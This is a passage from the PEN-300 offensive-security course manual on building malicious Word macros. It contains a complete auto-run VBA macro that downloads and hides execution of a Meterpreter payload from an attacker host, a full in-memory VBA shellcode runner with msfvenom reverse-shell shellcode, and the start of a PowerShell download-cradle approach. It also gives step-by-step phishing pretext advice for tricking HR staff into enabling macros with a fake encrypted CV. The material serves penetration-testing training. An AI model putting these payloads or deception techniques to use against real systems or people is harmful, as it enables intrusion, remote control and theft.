 
Sub AutoOpen() 
    MyMacro 
End Sub 
 
Sub MyMacro() 
    Dim str As String 
    str = "powershell (New-Object 
System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 
'msfstaged.exe')" 
    Shell str, vbHide 
    Dim exePath As String 
    exePath = ActiveDocument.Path + "\msfstaged.exe" 
    Wait (2) 
    Shell exePath, vbHide 
 
End Sub 
 
Sub Wait(n As Long) 
    Dim t As Date 
    t = Now 
    Do 
        DoEvents 
    Loop Until Now >= DateAdd("s", n, t) 
End Sub 
Listing 31 - Complete VBA macro to download Meterpreter executable and execute it 
Let’s review what we did. We built a Word document that pulls the Meterpreter executable from 
our web server when the document is opened (and macros are enabled). We added a small time 
delay to allow the file to completely download. We then executed the file hidden from the user. 
This results in a reverse Meterpreter shell. 
3.2.3.1 Exercises 
1. 
Replicate the Word macro to obtain a reverse shell. Implement it in Excel. 
2. 
Experiment with another PowerShell download cradle like Invoke-WebRequest. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
52 
3.3 Keeping Up Appearances 
Now that we understand how to use a Word document and a macro to get remote access on a 
client, we can turn our attention to the more human element of getting the victim to actually 
execute it. 
When performing a client-side phishing attack, we must deceive the victim. In some cases, we 
must deceive them multiple times. For example, we might need to convince them to open a file, 
enable options (such as enabling macros), or browse to a given URL. All of this must occur 
without alerting them to our malicious intent and action. 
To do this, we must rely on pretexting. A pretext is essentially a false motive. We will use this false 
motive in a social engineering attack, essentially lying to our target to convince them to do 
something they wouldn’t normally do. 
3.3.1 Phishing PreTexting 
A phishing attack exploits a victim’s behavior, leveraging their curiosity or fear to encourage them 
to launch our payload despite their better judgement. Popular mechanisms include job 
applications, healthcare contract updates, invoices or human resources requests, depending on 
the target organization and specific employees. 
When using Microsoft Office in a phishing attack, an attacker will typically present a document, 
state that the document is encrypted or protected, and suggest that the user must Enable Editing 
and Enable Content to properly view the document. 
This technique is used in the popular Quasat RAT89 and Ursnif Trojan90 among 
others. 
Once the user has opened the document, we should try to allay their suspicions. If the document 
is poorly constructed, or seems like spam, they may alert support personnel, which could 
compromise our attack. It’s best to avoid spelling and grammar mistakes and make sure the 
content matches the style of the ruse. We should also make an effort to make the document look 
legitimate by including product names and logos the users likely know and trust such as 
Microsoft or encryption standards like RSA. 
In the example below, we’ll propose that the attached job application document is encrypted to 
protect its content in accordance with GDPR91 regulations. If the victim does not have a strong 
technical background, these added terms and “tech magic” can make the document seem more 
legitimate. In this case, we’ll simply add some random base64-encoded text and a note about 
GDPR compliance: 
 
89 (Threat Post, 2019), https://threatpost.com/microsoft-word-resume-phish-malware/147733/ 
90 (Bank Info Security, 2019), https://www.bankinfosecurity.com/new-ursnif-variant-spreads-through-infected-word-documents-a-
12898 
91 (Wikipedia, 2019), https://en.wikipedia.org/wiki/General_Data_Protection_Regulation 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
53 
 
Figure 16: RSA encrypted job application 
To improve the perception of legitimacy, we can also add an RSA logo in the header as shown in 
Figure 17. 
 
Figure 17: RSA encrypted job application 
In this particular example, our victim works in human resources and the target organization has 
posted an opening for a human resource analyst. Because of this, we’ll keep our document 
centered on this pretext. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
54 
The bottom line is that we must keep up appearances to avoid alerting the victim. 
3.3.2 The Old Switcheroo 
When the victim enables our content, they will expect to see our “decrypted” content, in this case 
a resume. We also hope that the victim will keep the document open long enough for our reverse 
shell to connect. The best way to do this, and continue the deception, is to present relevant and 
expected content. 
Let’s take a moment to focus on developing relevant content, which varies based on our pretext. 
In our case, we are targeting an employee in Human Resources, so we’ll create an intriguing 
resume and include other HR-related material. 
To begin the development of our “decrypted” content, we’ll create a copy of this Word document, 
and delete the existing text content. Next, we’ll insert “decrypted” content, which will display when 
the user enables macros. This content will include the simple fake CV shown in Figure 18. 
 
Figure 18: CV to take the place of the fake RSA encrypted text 
With the text created, we’ll mark it and navigate to Insert > Quick Parts > AutoTexts and Save 
Selection to AutoText Gallery: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
55 
 
Figure 19: Place the selected text in the AutoText gallery 
In the Create New Building Block dialog box, we’ll enter the name “TheDoc”: 
 
Figure 20: Picking a name for the AutoText gallery entry 
With the content stored, we can delete it from the main text area of the document. Next, we’ll 
copy the fake RSA encrypted text from the original Word document and insert it into the main text 
area of this document. 
Now we’ll need to edit the VBA macro, inserting commands that will delete the fake RSA 
encrypted text and replace it with the fake CV from the AutoText entry. Luckily, this is pretty 
simple. 
The first step is to delete the fake RSA encrypted text through the ActiveDocument.Content92 
property (which returns a Range93 object). Then we’ll invoke the Select94 method to select the 
entire range of the ActiveDocument: 
ActiveDocument.Content.Select 
 
92 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/api/word.document.content 
93 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/api/word.document.range 
94 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/api/word.range.select 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
56 
Listing 32 - Select the entire range of the ActiveDocument 
With the content of the ActiveDocument selected, we can call Selection.Delete95 to delete it. 
Selection.Delete 
Listing 33 - Delete text of current Word document from VBA 
Now that the text is deleted, we can insert the fake CV. We’ll reference the AutoText entries from 
the AttachedTemplate96 of the ActiveDocument. This gives us access to all of the 
AutoTextEntries97 where we can choose our inserted text named “TheDoc”. 
To insert the text into the document, we’ll invoke the Insert98 function to insert the text in the 
document. Insert takes two arguments. The first sets the location of the insert and the second 
sets the formatting in the inserted text, which we will leave as the default RichText. We can 
combine this into a VBA one-liner (which displays in the listing below as two lines): 
ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert 
Where:=Selection.Range, RichText:=True 
Listing 34 - Insert text from AutoText gallery 
Now that we have reviewed all the components of this macro, let’s put everything together. To 
review, we use Document_Open and AutoOpen to guarantee that the macro will run when the 
document is opened and the user enables macros. When the macro runs, the SubstitutePage 
procedure selects all the text on the page, deletes it, and inserts our fake CV. The goal of this is to 
trick the victim into believing that they have decrypted our document. 
We are now able to put together the final macro that performs text replacement (“decryption”): 
Sub Document_Open() 
    SubstitutePage 
End Sub 
 
Sub AutoOpen() 
    SubstitutePage 
End Sub 
 
Sub SubstitutePage() 
    ActiveDocument.Content.Select 
    Selection.Delete 
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert 
Where:=Selection.Range, RichText:=True 
End Sub 
Listing 35 - Full macro to replace visible content 
Let’s try this out. Opening the document will first show the “encrypted” document and wait for the 
user to enable macros. Once they do, the CV is “decrypted” and presented, as shown in the before 
and after excerpts in Figure 21. 
 
95 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/api/word.selection.delete 
96 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/api/word.document.attachedtemplate 
97 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/api/word.autotextentries 
98 (Microsoft, 2017), https://docs.microsoft.com/en-us/office/vba/api/word.autotextentry.insert 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
57 
 
Figure 21: Pretext text before and after enabling macros 
Although this scenario may seem far-fetched, this type of pretext is often successful and we have 
used it many times to trick a victim into disabling both Protected View and Macro security. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
58 
3.3.2.1 Exercises 
1. 
Create a convincing phishing pretext Word document for your organization or school that 
replaces text after enabling macros. 
2. 
Insert a procedure called MyMacro that downloads and executes a Meterpreter payload after 
the text has been switched. 
3.4 Executing Shellcode in Word Memory 
Now that we have a convincing document, let’s improve our technical tradecraft to avoid 
downloading an executable to the hard drive. Currently, our malicious macro downloads a 
Meterpreter executable to the hard drive and executes it. There are a couple of drawbacks to this. 
Our current tradecraft requires us to download an executable, which may be flagged by network 
monitoring software or host-based network monitoring. Secondly, we are storing the executable 
on the hard drive, where it may be detected by antivirus software. 
In this section, we’ll modify our attack and execute the staged Meterpreter payload directly in 
memory. This will be a slow process, but we will learn valuable techniques along the way. 
This concept exceeds the limits of VBA. This is partly due to the fact that the staged Meterpreter 
payload is actually pure assembly code that must be placed in a memory location and executed. 
Instead of using pure VBA, we can leverage native Windows operating system APIs99 within VBA. 
3.4.1 Calling Win32 APIs from VBA 
Windows operating system APIs (or Win32 APIs) are located in dynamic link libraries and run as 
unmanaged code. We’ll use the Declare100 keyword to link to these APIs in VBA, providing the 
name of the function, the DLL it resides in, the argument types, and return value types. We will use 
a Private Declare, meaning that this function will only be used in our local code. 
In this example, we’ll use the GetUserName101 API. We will build our declare function statement, 
and display the username in a popup with MsgBox. The official documentation provided by 
Microsoft on MSDN contains the function prototype shown in Listing 36. The documentation tells 
us the maximum size of the username, along with the DLL it resides in (Advapi32.dll). We can 
expand on that to declare the function we want. 
BOOL GetUserNameA( 
  LPSTR   lpBuffer, 
  LPDWORD pcbBuffer 
); 
Listing 36 - Function prototype of GetUserName 
The function arguments are described on MSDN as native C types and we must translate these to 
their corresponding VBA data types. The first argument is an output buffer of C type LPSTR which 
will contain the current username. It can be supplied as a String in VBA. 
 
99 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/visual-basic/programming-guide/com-interop/walkthrough-calling-
windows-apis 
100 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/declare-statement 
101 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
59 
 
Working out the conversion between C data types and VBA data types can be 
tricky. Microsoft has documentation on MSDN102,103 including some 
comparisons, but little official documentation exists. 
In C, the LPSTR is a pointer to a string. Similarly, the VBA String object holds the pointer to a 
string, rather than the string itself. For this reason we can pass our argument by value (with 
ByVal104), since the expected types match. 
The second argument (pcbBuffer) given in the function prototype as a C type is a pointer or 
reference to an DWORD (LPDWORD). It is the maximum size of the buffer that will contain the 
string. We may substitute that with the VBA Long data type and pass it by reference (ByRef105) to 
obtain a pointer in VBA. Finally, the output type in C is a boolean (BOOL GetUserNameA), which we 
can translate into a Long in VBA. 
Now that we have explained all the components, let’s put everything together. We’ll import our 
target function using Private Declare and supply the Windows API name and its DLL location, 
along with our arguments. The final Declare statement is given below. It must be placed outside 
the procedure. 
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal 
lpBuffer As String, ByRef nSize As Long) As Long 
Listing 37 - Declaring and importing the GetUserNameA Win32 API 
With the function imported, we must declare three variables; the return value, the output buffer, 
and the size of the output buffer. As specified on MSDN, the maximum allowed length of a 
username is 256 characters so we’ll create a 256-byte String called MyBuff and a variable called 
MySize as a Long and set it to 256. 
Function MyMacro() 
  Dim res As Long 
  Dim MyBuff As String * 256 
  Dim MySize As Long 
  MySize = 256 
   
  res = GetUserName(MyBuff, MySize) 
End Function 
Listing 38 - Setting up arguments and calling GetUserNameA 
Before we can print the result, recall that MyBuff can contain up to 256 characters but we do not 
know the length of the actual username. Since a C string is terminated by a null byte, we’ll use the 
 
102 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types 
103 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/data-types/ 
104 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/modifiers/byval 
105 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/modifiers/byref 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
60 
InStr106 function to get the index of a null byte terminator in the buffer, which marks the end of the 
string. 
As shown in Listing 39, the arguments for InStr are fairly straightforward. We defined the starting 
location (setting it to “1” for the beginning of the string), the string to search, and the search 
character (null byte). This will return the location of the first null byte, and we can subtract one 
from this number to get the string length. 
Function MyMacro() 
  Dim res As Long 
  Dim MyBuff As String * 256 
  Dim MySize As Long 
  Dim strlen As Long 
  MySize = 256 
   
  res = GetUserName(MyBuff, MySize) 
  strlen = InStr(1, MyBuff, vbNullChar) - 1 
  MsgBox Left$(MyBuff, strlen) 
End Function 
Listing 39 - Returning the result from GetUserNameA 
Now that we have the length of the string, we will print the non-null characters by using the Left107 
method as shown in the last highlighted line of Listing 39. Left creates a substring of its first 
argument with the size of its second argument. 
If we’ve called the Win32 API correctly, the macro will display the desired username (with no 
trailing spaces) as shown in Figure 22. 
 
Figure 22: MessageBox containing the username obtained through GetUserName 
While this is obviously only a proof of concept, it shows that we can call arbitrary Win32 APIs 
directly from VBA, which is required if we want to execute shellcode from memory. 
3.4.1.1 Exercises 
1. 
Replicate the call to GetUserName and return the answer. 
2. 
Import the Win32 MessageBoxA108 API and call it using VBA. 
 
106 (Microsoft, 2019), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/instr-function 
107 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/left-function 
108 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
61 
3.4.2 VBA Shellcode Runner 
Next, let’s investigate a shellcode runner, a piece of code that executes shellcode in memory. We’ll 
build this in VBA. 
The typical approach is to use three Win32 APIs from Kernel32.dll: VirtualAlloc, RtlMoveMemory, 
and CreateThread. 
We will use VirtualAlloc to allocate unmanaged memory that is writable, readable, and executable. 
We’ll then copy the shellcode into the newly allocated memory with RtlMoveMemory, and create a 
new execution thread in the process through CreateThread to execute the shellcode. Let’s inspect 
each of these Win32 APIs and reproduce them in VBA. 
Allocating memory through other Win32 APIs returns non-executable memory 
due to the memory protection called Data Execution Prevention (DEP)109 
We’ll take one API at a time, starting with VirtualAlloc.110 MSDN describes the following function 
prototype for VirtualAlloc: 
LPVOID VirtualAlloc( 
  LPVOID lpAddress, 
  SIZE_T dwSize, 
  DWORD  flAllocationType, 
  DWORD  flProtect 
); 
Listing 40 - Function prototype for VirtualAlloc 
This API accepts four arguments. The first, lpAddress, is the memory allocation address. If we 
leave this set to “0”, the API will choose the location. The dwSize argument indicates the size of 
the allocation. Finally, flAllocationType and flProtect indicate the allocation type and the memory 
protections, which we will come back to. 
The first argument and the return value are memory pointers that can be represented by LongPtr 
in VBA. The remaining three arguments are integers and can be translated to Long. 
Let’s declare these arguments in our first Declare statement (shown in Listing 41): 
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As 
LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As 
Long) As LongPtr 
Listing 41 - Function declaration for VirtualAlloc 
Now that we have our Declare statement, we need to figure out some of the values we need. 
Since we don’t yet know the size of our shellcode, let’s generate it first. 
 
109 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention 
110 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
62 
In order to generate the shellcode, we need to know the target architecture. Obviously we are 
targeting a 64-bit Windows machine, but Microsoft Word 2016 installs as 32-bit by default, so we 
will generate 32-bit shellcode. 
We’ll use msfvenom to a generate shellcode formatted as vbapplication, as the first stage of a 
Meterpreter shell. 
Since we will be executing our shellcode inside the Word application, we specify the EXITFUNC 
with a value of “thread” instead of the default value of “process” to avoid closing Microsoft Word 
when the shellcode exits. 
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 
LPORT=443 EXITFUNC=thread -f vbapplication 
... 
Payload size: 575 bytes 
Final size of vbapplication file: 1972 bytes 
buf = 
Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,
183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74
,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214
,49,255,172,193, _ 
... 
104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,2
55,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,57
,50,46,49,54,56,46,49,55,54,46,49,52,55,0,187,224,29,42,10,104,166,149,189,157,255,213
,60,6,124,10,128, _ 
251,224,117,5,187,71,19,114,111,106,0,83,255,213) 
Listing 42 - Generate shellcode in vbapplication format 
We’ll add this array to our VBA code. 
Next, we’ll set the arguments for VirtualAlloc. The MSDN documentation suggests that we should 
supply the value “0” as the lpAddress, which will leave the memory allocation to the API. For the 
second argument, dwSize, we could hardcode the size of our shellcode based on the output from 
msfvenom, but it’s better to set it dynamically. This way, if we change our payload, we won’t have 
to change this value. To do this, we’ll use the UBound111 function to get the size of the array (buf) 
containing the shellcode. 
For the third argument, we will use 0x3000, which equates to the allocation type enums of 
MEM_COMMIT and MEM_RESERVE.112 This will make the operating system allocate the desired 
memory for us and make it available. In VBA, this hex notation will be represented as &H3000. 
We’ll set the last argument to &H40 (0x40), indicating that the memory is readable, writable, and 
executable. 
Our complete VirtualAlloc call is shown in Listing 43. Note that the Meterpreter array stored in buf 
has been truncated for ease of display. 
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As 
LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As 
 
111 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ubound-function 
112 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
63 
Long) As LongPtr 
 
... 
 
Dim buf As Variant 
Dim addr As LongPtr 
 
buf = Array(232, 130, 0, 0, 0, 96, 137... 
 
addr = VirtualAlloc(0, UBound(buf), &H3000, &H40) 
Listing 43 - Calling VirtualAlloc from VBA 
Now that we’ve allocated memory with VirtualAlloc, we must copy the shellcode bytes into this 
memory location. This is done using the RtlMoveMemory113 function. MSDN describes this 
function prototype as: 
VOID RtlMoveMemory( 
  VOID UNALIGNED *Destination, 
  VOID UNALIGNED *Source, 
  SIZE_T         Length 
); 
Listing 44 - RtlMoveMemory function prototype 
This function takes three variables. The return value along with the first argument may be 
translated to LongPtr, the second uses Any, while the last argument may be translated to Long. 
The Destination pointer points to the newly allocated buffer, which is already a memory pointer, 
so it may be passed as-is. The Source buffer will be the address of an element from the shellcode 
array, and must be passed by reference, while the Length is passed by value. 
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As 
LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr 
Listing 45 - Declare statement for RtlMoveMemory 
We’ll use this API to loop over each element of the shellcode array and create a byte-by-byte copy 
of our payload. 
The loop condition uses the LBound114 and UBound115 methods to find the first and last element 
of the array. This is where our knowledge of For loops helps. 
The code snippet is shown in Listing 46. 
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As 
LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr 
 
.... 
 
Dim counter As Long 
Dim data As Long 
 
113 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory 
114 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/lbound-function 
115 (Microsoft, 2018), https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ubound-function 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
64 
 
For counter = LBound(buf) To UBound(buf) 
    data = buf(counter) 
    res = RtlMoveMemory(addr + counter, data, 1) 
Next counter 
Listing 46 - Call to import RtlMoveMemory and call it 
In this code, we imported RtlMoveMemory, declared two long variables and copied our payload. 
With the shellcode bytes copied into the executable buffer, we are ready to execute it with 
CreateThread.116 
CreateThread is a fairly complicated API and works by instructing the operating system to create 
a new execution thread in a process. We will use it to create an execution thread using 
instructions found at a specific memory address, which contains our shellcode. 
The function prototype of CreateThread from MSDN is shown in Listing 47. 
HANDLE CreateThread( 
  LPSECURITY_ATTRIBUTES   lpThreadAttributes, 
  SIZE_T                  dwStackSize, 
  LPTHREAD_START_ROUTINE  lpStartAddress, 
  LPVOID                  lpParameter, 
  DWORD                   dwCreationFlags, 
  LPDWORD                 lpThreadId 
); 
Listing 47 - Function prototype for CreateThread 
While the number of arguments and the associated documentation may seem daunting, most are 
not needed and we can set them to “0”. First, as with the previous APIs, we must import the 
function and translate its arguments to VBA data types. The first two are used to specify non-
default settings for the thread and since we won’t need them, we will set these values to zero and 
specify them as Long. 
The third argument, lpStartAddress, is the start address for code execution and must be the 
address of our shellcode buffer. This is translated to LongPtr. 
The fourth argument, lpParameter, is a pointer to arguments for the code residing at the starting 
address. Since our shellcode requires no arguments, we can set this parameter type to LongPtr 
with a value of zero. 
The declaration and import are shown below. 
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes 
As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As 
LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr 
Listing 48 - Declare statement for CreateThread 
Having declared the function, we may now call it. This line is pretty simple with only one variable 
for the start address of our shellcode buffer. 
 
116 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
65 
res = CreateThread(0, 0, addr, 0, 0, 0) 
Listing 49 - Call statement for CreateThread 
Now we can piece the entire VBA macro together as shown in Listing 50. 
In summary, we begin by declaring functions for the three Win32 APIs. Then we declare five 
variables, including a variable for our Meterpreter array and use VirtualAlloc to create some space 
for our shellcode. Next, we use RtlMoveMemory to put our code in memory with the help of a For 
loop. Finally, we use CreateThread to execute our shellcode. 
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes 
As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As 
LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr 
 
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As 
LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As 
Long) As LongPtr 
 
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As 
LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr 
 
Function MyMacro() 
    Dim buf As Variant 
    Dim addr As LongPtr 
    Dim counter As Long 
    Dim data As Long 
    Dim res As Long 
     
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 
12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 
193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 
227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 
214, 49, 255, 172, 193, _ 
... 
49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10, 
104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 
114, 111, 106, 0, 83, 255, 213) 
 
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40) 
     
    For counter = LBound(buf) To UBound(buf) 
        data = buf(counter) 
        res = RtlMoveMemory(addr + counter, data, 1) 
    Next counter 
     
    res = CreateThread(0, 0, addr, 0, 0, 0) 
End Function  
 
Sub Document_Open() 
    MyMacro 
End Sub 
 
Sub AutoOpen() 
    MyMacro 
End Sub 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
66 
Listing 50 - Full VBA script to execute Meterpreter staged payload in memory 
When executed, our shellcode runner calls back to the Meterpreter listener and opens the reverse 
shell as expected, entirely in memory. 
To work as expected, this requires a matching 32-bit multi/handler in Metasploit 
with the EXITFUNC set to “thread” and matching IP and port number. 
This approach is rather low-profile. Our shellcode resides in memory and there is no malicious 
executable on the victim’s machine. However, the primary disadvantage is that when the victim 
closes Word, our shell will die. In the next section, we will once again turn to the strength of 
PowerShell to overcome this disadvantage. 
Although Metasploit’s AutoMigrate module solves this, we’ll explore an 
alternative approach. 
3.4.2.1 Exercise 
1. 
Recreate the shellcode runner in this section. 
3.5 PowerShell Shellcode Runner 
Although we have a working exploit, there’s room for improvement. First, the document contains 
the embedded first-stage Meterpreter shellcode and is saved to the hard drive where it may be 
detected by antivirus. Second, the VBA version of our attack executed the shellcode directly in 
memory of the Word process. If the victim closes Word, we’ll lose our shell. 
In this section, we’ll change tactics a bit. First, we’ll instruct the macro to download a PowerShell 
script (which contains our staging shellcode) from our web server and run it in memory. This is an 
improvement over our previous version that embedded the shellcode in the macro within the 
malicious document. Next, we’ll launch the PowerShell script as a child process of (and from) 
Microsoft Word. Under a default configuration, the child process will not die when Microsoft Word 
is closed, which will keep our shell alive. 
To accomplish this, we’ll use the DownloadString117 method of the WebClient class to download 
the PowerShell script directly into memory and execute it with the Invoke-Expression118 
commandlet. 
We can reuse the exact same Windows APIs to execute the shellcode. However, we must 
translate the syntax from VBA to PowerShell. This means we must spend some time discussing 
the basics of calling Win32 APIs from PowerShell. 
 
117 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=netframework-4.8 
118 (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-
expression?view=powershell-6 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
67 
3.5.1 Calling Win32 APIs from PowerShell 
PowerShell cannot natively interact with the Win32 APIs, but with the power of the .NET 
framework we can use C# in our PowerShell session. In C#, we can declare and import Win32 
APIs using the DllImportAttribute119 class. This allows us to invoke functions in unmanaged 
dynamic link libraries. 
Just like with VBA, we must translate the C data types to C# data types. We can do this easily 
with Microsoft’s Platform Invocation Services, commonly known as P/Invoke.120 The P/Invoke 
APIs are contained in the System121 and System.Runtime.InteropServices122 namespaces and 
must be imported through the using123 directive keyword. 
The simplest way to begin with P/Invoke is through the www.pinvoke.net website, which 
documents translations of the most common Win32 APIs. 
For example, consider the syntax of MessageBox from User32.dll, shown below. 
int MessageBox( 
  HWND    hWnd, 
  LPCTSTR lpText, 
  LPCTSTR lpCaption, 
  UINT    uType 
); 
Listing 51 - C function prototype for MessageBox 
Let’s “translate” this into a C# method signature. A method signature is a unique identification of a 
method for the C# compiler. The signature consists of a method name and the type and kind 
(value, reference, or output) of each of its formal parameters and the return type. 
To “translate” this, we can either search the www.pinvoke.net website or simply Google for 
pinvoke User32 messagebox. The first hit leads us to the C# signature for the call: 
[DllImport("user32.dll", SetLastError = true, CharSet= CharSet.Auto)] 
public static extern int MessageBox(int hWnd, String text, String caption, uint type); 
Listing 52 - C# DllImport statement for MessageBox 
In order to use this, we’ll need to add a bit of code to import the System and 
System.Runtime.InteropServices namespaces containing the P/Invoke APIs. 
Then, we’ll create a C# class (User32) which imports the MessageBox signature with DllImport. 
This class will allow us to interact with the Windows API. 
using System; 
using System.Runtime.InteropServices; 
 
 
119 (Microsoft, 2018), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.interopservices.dllimportattribute?view=netframework-4.8 
120 (Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke 
121 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system?view=netframework-4.8 
122 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices?view=netframework-4.8 
123 (Microsoft, 2015), https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/using-directive 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
